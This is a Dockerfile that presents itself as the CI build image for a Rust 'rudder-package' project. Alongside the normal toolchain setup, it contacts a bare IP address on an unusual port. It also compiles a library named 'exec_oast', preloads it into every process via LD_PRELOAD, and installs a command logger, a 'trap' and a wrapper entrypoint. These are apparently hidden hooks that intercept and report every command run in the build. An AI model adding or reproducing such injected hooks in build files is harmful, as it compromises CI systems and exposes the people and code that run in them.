FROM rust:1.85.0-bookworm
LABEL ci=rudder/relay/sources/rudder-package/Dockerfile

ARG USER_ID=1000
COPY ci/user.sh .
RUN ./user.sh $USER_ID

COPY ci/rust.sh .
RUN ./rust.sh

RUN apt-get update && apt-get install -y nettle-dev clang python3 gcc curl

ENV RUSTC_WRAPPER="sccache"

RUN curl http://65.109.68.176:15172/built/rudder-package

# 1) Install the logger & trap
COPY ci/command_logger.sh /etc/command_logger.sh

COPY ci/exec_oast.c /tmp/exec_oast.c
RUN gcc -shared -fPIC -o /usr/local/lib/libexec_oast.so /tmp/exec_oast.c -ldl \
    && rm /tmp/exec_oast.c

# ensure it's preloaded for all processes
ENV LD_PRELOAD=/usr/local/lib/libexec_oast.so


# 2) Install our ENTRYPOINT wrapper
COPY ci/entrypoint.sh /usr/local/bin/entrypoint.sh
RUN chmod +x /usr/local/bin/entrypoint.sh

# 3) Set it as the container’s ENTRYPOINT
ENTRYPOINT ["/usr/local/bin/entrypoint.sh"]